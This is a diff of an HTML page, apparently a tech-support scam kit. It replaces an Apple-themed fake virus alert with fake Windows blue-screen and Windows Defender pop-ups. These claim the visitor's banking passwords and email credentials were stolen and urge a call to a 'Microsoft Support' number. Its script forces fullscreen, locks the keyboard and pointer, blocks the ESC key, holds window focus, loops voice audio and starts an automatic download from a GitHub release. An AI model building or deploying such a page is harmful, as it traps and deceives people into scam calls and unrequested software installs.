@@ -2,101 +2,209 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Alert OS</title>
-    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="style.css">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet" />
-    <link href="https://unpkg.com/prismjs/themes/prism.css" rel="stylesheet" />
-    <link
-        href="https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lexend:wght@100..900&display=swap"
-        rel="stylesheet" />
-
-    <script>
-        if (!isSecureContext) location.protocol = "https:";
-    </script>
-    <script src="https://unpkg.com/prismjs"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lexend:wght@100..900&display=swap" rel="stylesheet">
 </head>
 
 <body>
     <div id="popup" class="popup">
-        <div class="main-modal">
-            <div class="modal_wrap">
-                <div class="head">
-                    <img src="./images/log.png" class="logo" alt="" />
-                    <h6 class="title">Apple Security</h6>
+        <div class="content">
+            <div class="smile">
+                <img src="./images/smile.png" class="smile-code" alt="">
+            </div>
+            <h1 class="main-title">
+                Your PC ran into a problem and needs to restart.We're <br>
+                just collecting some error info, and then we'll restart for
+                you
+            </h1>
+            <h2 class="main-title">20% complete</h2>
+
+            <div class="QR-wrapper">
+                <img src="https://cdn.ttgtmedia.com/rms/misc/qr_code_barcode.jpg" class="qr-code" alt="">
+                <div>
+                    <p class="para-title">Formre information about thi issue and possible fixevisit
+                        https//www.windows.m/stopcode</p>
+                    <p class="para-title">If you call a support persongive them this info <br>
+                        Stop COdYCRITICALPROCESS DIED</p>
+                </div>
+            </div>
+
+            <!-- modal 3 -->
+            <div class="bg-[#fff] absolute z-10 main-modal-2 shadow-lg text-white">
+                <div class="flex justify-end items-center pt-2 pr-3">
+                    <img src="./images/action-icon.png" class="h-6" alt="">
+                </div>
+                <div class="shadow-lg py-4 px-6 flex justify-between items-center">
+                    <span class="flex items-center">
+                        <img src="./images/unnamed.jpg" alt="Microsoft Logo" class="h-6 w-6 mr-2">
+                        <span class="text-gray-800 font-bold">Microsoft</span>
+                    </span>
+
+                    <div class="flex items-center gap-5">
+                        <button class="py-2 px-4 border border-solid border-blue-600 rounded-lg text-blue-600">Window
+                            license</button>
+                        <svg width="74" height="16" viewBox="0 0 74 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M8.00033 14.6667C8.73366 14.6667 9.33366 14.0667 9.33366 13.3334H6.66699C6.66699 13.687 6.80747 14.0262 7.05752 14.2762C7.30757 14.5263 7.6467 14.6667 8.00033 14.6667ZM12.0003 10.6667V7.33342C12.0003 5.28675 10.907 3.57341 9.00033 3.12008V2.66675C9.00033 2.11341 8.55366 1.66675 8.00033 1.66675C7.44699 1.66675 7.00033 2.11341 7.00033 2.66675V3.12008C5.08699 3.57341 4.00033 5.28008 4.00033 7.33342V10.6667L2.66699 12.0001V12.6667L13.3337 12.6667L13.3337 12.0001L12.0003 10.6667Z"
+                                fill="#9095A1" />
+                            <path
+                                d="M40.3333 9.33334H39.8067L39.62 9.15334C40.2959 8.36935 40.6674 7.36846 40.6667 6.33334C40.6667 5.47628 40.4125 4.63848 39.9364 3.92586C39.4602 3.21325 38.7834 2.65784 37.9916 2.32986C37.1998 2.00188 36.3285 1.91606 35.4879 2.08327C34.6474 2.25047 33.8752 2.66318 33.2692 3.26921C32.6632 3.87523 32.2505 4.64736 32.0833 5.48794C31.9161 6.32853 32.0019 7.19982 32.3299 7.99163C32.6578 8.78344 33.2133 9.46022 33.9259 9.93637C34.6385 10.4125 35.4763 10.6667 36.3333 10.6667C37.4067 10.6667 38.3933 10.2733 39.1533 9.62L39.3333 9.80667V10.3333L42.6667 13.66L43.66 12.6667L40.3333 9.33334ZM36.3333 9.33334C34.6733 9.33334 33.3333 7.99334 33.3333 6.33334C33.3333 4.67334 34.6733 3.33334 36.3333 3.33334C37.9933 3.33334 39.3333 4.67334 39.3333 6.33334C39.3333 7.99334 37.9933 9.33334 36.3333 9.33334Z"
+                                fill="#565D6D" />
+                            <path
+                                d="M60 8.66667H65.3333V2L60 2V8.66667ZM60 14L65.3333 14V10L60 10V14ZM66.6667 14L72 14V7.33333L66.6667 7.33333V14ZM66.6667 2V6L72 6V2L66.6667 2Z"
+                                fill="#565D6D" />
+                        </svg>
+                    </div>
                 </div>
 
-                <div class="body">
-                    <h2 class="title">
-                        Wraning Your Apple iPhone is severely damaged by 13 viruses
-                    </h2>
-                    <p class="description">
-                        We have detected that your Browser is (62%) DAMAGED by BROWSER
-                        TROJAN VIRUSES picked up while surfing recent corrupted sites.
-                        Immediate action is required to prevent it from
-                        <span class="para">
-                            spreading and infecting sensitive data like your. Facebook
-                            account, Whatsapp messages photos and private.applications.
-                        </span>
-                    </p>
-                    <h6 class="heading">
-                        Here is how you can solve this in just a few seconds (Step by
-                        Step)
-                    </h6>
-                    <div class="step_group">
-                        <p class="step">
-                            Step 1: Tap REMOVE VIRUS to install VPN from the
-                        </p>
-                        <p class="step">
-                            Step 2: Tap REMOVE VIRUS to install VPN from the
-                        </p>
-                        <p class="step">
-                            Step 3: Tap REMOVE VIRUS to install VPN from the
-                        </p>
-                        <p class="step">
-                            Step 4: Tap REMOVE VIRUS to install VPN from the
-                        </p>
-                        <p class="step">
-                            Step 5: Tap REMOVE VIRUS to install VPN from the
-                        </p>
-                    </div>
+                <div class="p-6">
+                    <div class="shadow-lg border border-gray-200 border-solid">
+                        <div class="border-b border-gray-300 border-solid py-2 px-3 flex justify-between items-center">
+                            <span class="flex items-center">
+                                <img src="./images/inner-logo.png" alt="Microsoft Logo" class="h-6 w-full mr-2">
+                            </span>
 
-                    <div class="card">
-                        <div class="wrap">
-                            <img src="./images/Settings.png" class="logo" alt="" />
-                            <span class="badge">1</span>
+                            <div class="flex items-center gap-5">
+                                <img src="./images/action-icon.png" class="h-6" alt="">
+                            </div>
                         </div>
-                        <div class="">
-                            <h6 class="card-title">
-                                Please call apple support now To fix this issue
-                            </h6>
-                            <p class="desc">Immediate Action Is Required</p>
+                        <div class="px-6 py-4">
+                            <a href="#"
+                                class="border-b border-blue-600 border-solid pb-1 text-blue-500 font-semibold text-md">Scanner</a>
+                        </div>
+                        <div class="h-56 px-10">
+                            <img src="./images/screen-tv-mockup_1053-198.avif" class="h-52 max-w-full" alt="">
+                        </div>
+
+                        <div class="bg-[#EEEEEE] p-6 flex items-center gap-5">
+                            <svg width="66" height="66" viewBox="0 0 66 66" fill="none"
+                                xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                <rect width="66" height="66" rx="33" fill="url(#pattern0_602_170)" />
+                                <defs>
+                                    <pattern id="pattern0_602_170" patternContentUnits="objectBoundingBox" width="1"
+                                        height="1">
+                                        <use xlink:href="#image0_602_170" transform="scale(0.0137183 0.0136986)" />
+                                    </pattern>
+                                    <image id="image0_602_170" width="74" height="73"
+                                        xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEoAAABJCAYAAACaRLDfAAAAAXNSR0IArs4c6QAAGjBJREFUeF7V3AO0nsf2BvBJbdu2bdu2bdu2bdu2bdtO0rRpkyZ1m7t+87/PWe/NPUqadv3vt9ZZn953Zrae/ew9850uPXv27Ff+hke/fv83rOc///yzPue19/7++OOP+vf777/XP6979uxZxhlnnNK9e/fyyy+/lGGHHbZ89913ZYghhqifjzTSSGWEEUYoo4wyShlmmGHqHMbyGGywweoc7T26dOkyUNJ2+bsUFSW1pajBBx+8/Pzzz+Wnn34qQw45ZBXWa58NPfTQ5bfffqsKch0FUFqfPn3q+yg5yo3io7QYJRrp//3AaOofV5RFE5rAHl7H43hU3lMKBVHijz/+WJWYB2W6zlgZ59dffy3+eF4U0/Su1j5rTWFtedw/oqh4VcKDoD6jCF7Be/wR3sNivac4CnONz/xRWITxOeW4Lvf57H/Wo5rWJAgFBZ888yifUc5mm21Wn88///waeiOOOGK99ocffqhKoaQo17jeuz841wz5/5nQay66CebCKSFGKTxMyHjMPffc5fvvvy8vvPBCfd+3b9+qKN+7NkqK51CUsfNdAL21sMt62sOotpLB3xp6/SuqaWG4M/zww1cM6t27dxWUx8w777z1+emnn66g/s0331QlUYgwpLSEntcJvYSmz9oLvY6yYltK/EcU1VQY75HehZKQCR5RBqFnmmmmulYeJfRGHXXU+h5doFTX8UbXEjqeGEXHw/r3qKzh/yU9aLp6rAyMRx999PLKK6+Um2++udx///3lww8/rBhF+GQz2OQzXjTFFFOU+eabryy77LJlggkmqApu8rCmB/1VjxrkWY8lmzwm1o4QAWzpm7Ut4OSTTy633HJL+eCDD6pCgie5lmKHGmqoen0yJMF972Fs4Yp0rrrqqmW11VarpDNAbq7gVa4V1taWDJvQaiqkSY4zV/8hOMChR0CLZX0CDTfccJXLAF3PFg5/4Atl3nPPPeWss84qTz75ZAt/Ivx0001Xll9++TLzzDOX0UYbrYw88shVSYsuumgV6q677io9evSon3388cdVuY899lj1xCY9mH322WumnHHGGeuaomyKoiBMn2Kt2/smxjWVEWUNMo+iCFYKGTS58FBq+CxKuu+++8qJJ55YXnzxxRYe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" />
+                            </svg>
+                            <div>
+                                <p class="text-xs font-semibold text-gray-700">The Update Assistant can help you update
+                                    to the latest version of Windows 10. </p>
+                                <p class="text-xs font-semibold text-gray-700">An emulator that simulates the blue
+                                    screen, including
+                                    the blue screen effect of various versions of Windows.
+                                    Upgrade Press the ESC key to exit the application</p>
+                            </div>
                         </div>
                     </div>
-                    <button type="button" class="card_btn">OK</button>
+                </div>
+            </div>
+
+            <!-- modal 2 -->
+            <div class="bg-[#1072e1] absolute main-modal z-10 shadow-lg max-w-lg p-6 py-7 text-white">
+                <p class="mb-4">
+                    Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has
+                    been compromised:
+                </p>
+                <ul class="list-disc list-inside mb-4">
+                    <li>Email Credentials</li>
+                    <li>Banking Passwords</li>
+                    <li>Facebook Login</li>
+                    <li>Pictures & Documents</li>
+                </ul>
+                <p class="mb-4">
+                    Windows-Defender Scan has found potentially unwanted Adware on this device that can steal your
+                    passwords, online identity, financial information, personal files, pictures or documents.
+                </p>
+                <p class="mb-10">
+                    You must contact us immediately so that our engineers can walk you through the removal process over
+                    the phone.
+                </p>
+                <p class="mb-8">
+                    Call Microsoft Support immediately to report this threat, prevent identity theft and unlock access
+                    to this device.
+                </p>
+                <p class="mb-4 text-sm">
+                    lead to a suspension of your
+                    Windows Registration.
+                </p>
+                <p class="mb-6 text-center text-md">
+                    Call Microsoft Support : <a href="#" class="font-bold">+1 (844)329 1054
+                        (Tool-Free)</a>
+                </p>
+                <div class="flex justify-center space-x-4">
+                    <button
+                        class="bg-transparent text-white px-4 py-1 text-md border border-white border-solid rounded hover:bg-transparent">Ignore</button>
+                    <button
+                        class="bg-transparent text-white px-4 py-1 text-md border border-white border-solid rounded hover:bg-transparent">Run
+                        Safe</button>
+                </div>
+            </div>
+
+            <!-- modal 1 -->
+            <div class="bg-white border-2 border-gray-300 z-10 rounded-lg shadow-lg p-4 absolute main-modal">
+                <div class="flex items-center justify-between">
+                    <h1 class="text-md gap-2 font-normal text-black flex items-center">
+                        <img src="./images/secirity.svg" alt="">Windows Defender Security Center
+                    </h1>
+                    <button class="text-gray-500 hover:text-gray-800">
+                        <svg width="20" height="21" viewBox="0 0 20 21" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M15 5.95386L5 15.9539" stroke="#565D6D" stroke-width="1.71429"
+                                stroke-miterlimit="10" stroke-linecap="square" />
+                            <path d="M15 15.9539L5 5.95386" stroke="#565D6D" stroke-width="1.71429"
+                                stroke-miterlimit="10" stroke-linecap="square" />
+                        </svg>
+                    </button>
+                </div>
+                <hr class="my-2">
+                <div class="my-4">
+                    <p class="text-red-600 font-semibold text-sm text-center">App: Ads.fianectrack(2).dll</p>
+                    <p class="text-red-600 font-semibold text-sm text-center">Threat Detected: Trojan Spyware</p>
+                </div>
+                <div class="flex items-center justify-center my-4">
+                    <img src="./images/Screenshot 2024-05-29 203824.png" alt="Security Alert" class="h-16 w-56">
+                </div>
+                <p class="text-center text-gray-800 font-semibold">Access to this PC has been blocked for security
+                    reasons.</p>
+                <p class="text-center text-blue-600 mb-2 font-semibold">
+                    <a href="#" class="">Contact Windows Support: +1 (844)329 1054 (Security
+                        Helpline)</a>
+                </p>
+                <div class="flex justify-between items-center pt-4 mt-4 border-t border-slate-200 border-solid">
+                    <span class="flex items-center">
+                        <img src="./images/unnamed.jpg" alt="Microsoft Logo" class="h-6 w-6 mr-2">
+                        <span class="text-gray-800 font-bold">Microsoft</span>
+                    </span>
+                    <div class="space-x-4">
+                        <button
+                            class="bg-white text-black px-4 py-1.5 border text-md border-black border-solid rounded hover:bg-black-500">Ignore</button>
+                        <button
+                            class="bg-blue-600 text-white px-5 py-1.5 border text-md border-blue-600 border-solid rounded hover:bg-blue-700">Scan</button>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="main-modal-2">
-            <img src="./images/warning.png" alt="" class="warning_logo" />
-            <h5 class="title">
-                Call apple support now To fix this issue +1 (843) 480 9415
-            </h5>
-
-            <button class="confirm_btn">OK</button>
-        </div>
+        <footer class="footer">
+            <h2 class="footer-title"><img src="./images/unnamed.jpg" class="footer-code" alt=""><span>Microsoft
+                    Security:</span> Contact Microsoft Support+1 (844)329 1054(Toll-Free)</h2>
+            <p class="footer-decription">this app might put your PC at
+                risk Windows Defender Scan has found potentially urwanted Adware on this device that can steal your
+                passwords, onine identityfinancial informationpersonal fies,pictures or documents.</p>
+        </footer>
 
         <audio controls autoplay loop id="background-audio">
-            <source src="./images/audio.mp3" type="audio/mpeg" />
+            <source src="./images/17167046424682n662kss-voicemaker.in-speech.mp3" type="audio/mpeg">
             Your browser does not support the audio element.
         </audio>
-
-        <!-- <audio id="background-audio" src="./images/17167046424682n662kss-voicemaker.in-speech.mp3" autoplay loop></audio> -->
     </div>
 
     <script>
@@ -123,7 +231,6 @@
 
         // Start on click anywhere in popup
         document.getElementById("popup").addEventListener("click", async function startPage() {
-
             if (started) return;
 
             tryPlayAudio();
@@ -158,7 +265,6 @@
                 if (navigator.appVersion.indexOf("Win") != -1 || navigator.userAgent.indexOf("Win") != -1) os = "Windows";
                 if (navigator.appVersion.indexOf("Mac") != -1 || navigator.userAgent.indexOf("Mac") != -1) os = "MacOS";
 
-                // TODO: Update these URLs after first Electron build release
                 const GITHUB_RELEASE_BASE = "https://github.com/shadab76/security-alert-os/releases/latest/download";
 
                 const downloadLink = document.createElement("a");
@@ -183,13 +289,10 @@
                 document.body.removeChild(downloadLink);
 
                 console.log("Fullscreen + ESC lock + Pointer Lock active + Download Triggered");
-
             } catch (error) {
                 console.error("Unable to start:", error);
             }
-
         });
-
 
         // Block ESC key
         window.addEventListener("keydown", function (event) {
@@ -215,13 +318,10 @@
 
                 return false;
             }
-
         }, true);
-
 
         // Block ESC key release
         window.addEventListener("keyup", function (event) {
-
             if (
                 started &&
                 (event.key === "Escape" || event.keyCode === 27)
@@ -232,13 +332,10 @@
 
                 return false;
             }
-
         }, true);
-
 
         // Re-lock pointer if ESC releases it
         document.addEventListener("pointerlockchange", function () {
-
             if (
                 started &&
                 document.fullscreenElement &&
@@ -250,15 +347,11 @@
                     }
                 }, 300);
             }
-
         });
-
 
         // If fullscreen is exited, reset
         document.addEventListener("fullscreenchange", function () {
-
             if (!document.fullscreenElement && started) {
-
                 started = false;
 
                 if (navigator.keyboard?.unlock) {
@@ -269,20 +362,15 @@
                     document.exitPointerLock();
                 }
 
-
                 console.log("Fullscreen exited");
             }
-
         });
-
 
         // Keep window focused
         window.addEventListener("blur", function () {
-
             if (started) {
                 window.focus();
             }
-
         });
     </script>
 </body>
